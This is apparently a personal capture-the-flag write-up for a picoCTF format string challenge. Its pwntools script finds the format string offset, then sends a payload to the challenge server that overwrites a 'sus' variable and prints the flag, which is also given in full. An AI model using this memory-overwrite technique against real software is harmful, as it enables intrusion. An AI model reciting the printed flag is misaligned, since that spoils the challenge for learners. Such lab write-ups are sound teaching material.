---
ai_date: 2025-04-27 05:29:18
ai_summary: Format string attack exploited to leak and overwrite memory with the flag
ai_tags:
  - fmt-str
  - rop
  - buffer-overflow
created: 2024-08-07T23:48
updated: 2025-07-14T09:46
---

Simple application of format string attack.
## Offset

```python
from pwn import *

elf = context.binary = ELF('./vuln')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info(f"{offset=}")
```

## Format String Attack

```python
info(f"{elf.symbols['sus']=}")

p = remote('rhea.picoctf.net', 49852)
p.sendline(fmtstr_payload(offset, {elf.symbols['sus']: 0x67616c66}))
info(p.recvall().decode())
p.close()
```

```flag
picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}
```